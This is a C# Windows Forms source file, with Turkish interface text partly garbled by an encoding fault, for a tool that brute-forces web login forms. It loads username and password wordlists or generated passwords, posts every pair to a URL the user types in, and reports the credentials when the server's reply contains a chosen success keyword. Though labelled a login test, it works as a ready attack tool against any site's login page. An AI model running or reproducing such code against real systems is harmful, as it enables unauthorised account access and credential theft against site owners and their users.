using System.Threading;

namespace createhack
{
    public partial class Form1 : Form
    {
        private CancellationTokenSource cancellationTokenSource;
        public Form1()
        {
            InitializeComponent();
        }

        

        private void LoadUserFileButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Title = "Kullan�c� Ad� Dosyas�n� Se�in",
                Filter = "Text files (.txt)|*.txt"
            };

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                user_txt_richTextBox1.Text = File.ReadAllText(openFileDialog.FileName);
            }
        }

        private void LoadPasswordFileButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Title = "�ifre Dosyas�n� Se�in",
                Filter = "Text files (.txt)|*.txt"
            };

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                sifre_txt_richTextBox1.Text = File.ReadAllText(openFileDialog.FileName);
            }
        }

        private void btnCruch_Click(object sender, EventArgs e)
        {
            Form2 crunchForm = new Form2();
            crunchForm.PasswordGenerated += (passwords) =>
            {
                sifre_txt_richTextBox1.Lines = passwords.ToArray(); // �ifreleri Ana Formdaki RichTextBox'a aktar
            };
            crunchForm.Show();
        }

        private async void StartButton_Click(object sender, EventArgs e)
        {
            cancellationTokenSource = new CancellationTokenSource();
            tssCal�s�yor.Visible = true;
            tspProges.Visible = true;
            string url = URLtextbox.Text.Trim();
            if (string.IsNullOrEmpty(URLtextbox.Text))
            {
                MessageBox.Show("L�tfen Url Giriniz");
            }

            if (!url.StartsWith("http://") && !url.StartsWith("https://"))
            {
                url = "http://" + url;
            }



            string successKeyword = Basarianahtaritextbox.Text.Trim();
            string formUsernameKey = Kullan�c�_ad�_form_degiskeni_textbox.Text.Trim();
            string formPasswordKey = sifre_form_degiskeni_textbox.Text.Trim();

            string[] usernames = user_txt_richTextBox1.Text.Split(new[] { "\n", "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
            string[] passwords = sifre_txt_richTextBox1.Text.Split(new[] { "\n", "\r\n" }, StringSplitOptions.RemoveEmptyEntries);

            Denenenrichtextbox.Clear();
            AppendText("--- Brute-force Login Test Ba�lat�l�yor ---\n");

            try
            {
                await BruteForceTest(url, successKeyword, formUsernameKey, formPasswordKey, usernames, passwords, cancellationTokenSource.Token);
            }
            catch (OperationCanceledException)
            {
                AppendText("Test durduruldu.\n");
            }
            finally
            {
                cancellationTokenSource.Dispose();
                tspProges.Value = 100;
            }
        }

        private async Task BruteForceTest(string url, string successKeyword, string formUsernameKey, string formPasswordKey, string[] usernames, string[] passwords, CancellationToken token)
        {
            using (HttpClient client = new HttpClient())
            {
                foreach (string username in usernames)
                {
                    foreach (string password in passwords)
                    {
                        token.ThrowIfCancellationRequested();

                        var content = new FormUrlEncodedContent(new[]
                        {
                            new KeyValuePair<string, string>(formUsernameKey, username),
                            new KeyValuePair<string, string>(formPasswordKey, password)
                        });

                        try
                        {
                            HttpResponseMessage response = await client.PostAsync(url, content, token);
                            string responseBody = await response.Content.ReadAsStringAsync();

                            // Debug ama�l� d�nen cevab� kontrol edelim
                            AppendText($"Sunucudan gelen yan�t:\n{responseBody}\n");

                            if (responseBody.Contains(successKeyword))
                            {
                                AppendText($"[BA�ARILI] Kullan�c� ad�: {username} | �ifre: {password}\n");
                                var result = MessageBox.Show($"Do�ru �ifre bulundu!\nKullan�c� Ad�: {username}\n�ifre: {password}\nDevam etmek ister misiniz?", "�ifre Yakaland�!", MessageBoxButtons.YesNo);

                                if (result == DialogResult.No)
                                {
                                    cancellationTokenSource.Cancel();
                                    return;
                                }
                            }
                            else
                            {
                                AppendText($"[BA�ARISIZ] Kullan�c� ad�: {username} | �ifre: {password}\n");
                            }
                        }
                        catch (HttpRequestException ex)
                        {
                            AppendText($"Hata: {ex.Message}\n");
                        }
                    }
                }
            }

            AppendText("--- Test Tamamland� ---\n");
        }

        private void AppendText(string text)
        {
            Denenenrichtextbox.AppendText(text);
            Denenenrichtextbox.ScrollToCaret();
        }

        private void StopButton_Click(object sender, EventArgs e)
        {
            try
            {
                tssCal�s�yor.Visible = false;
                tspProges.Visible = false;
                if (cancellationTokenSource != null)
                {
                    cancellationTokenSource.Cancel();

                }
                else
                {
                    MessageBox.Show("Ba�ar�l� token olu�mad�");
                }

            }
            catch (HttpRequestException ex)
            {
                AppendText($"Hata: {ex.Message}\n");
            }
        }
    }
}
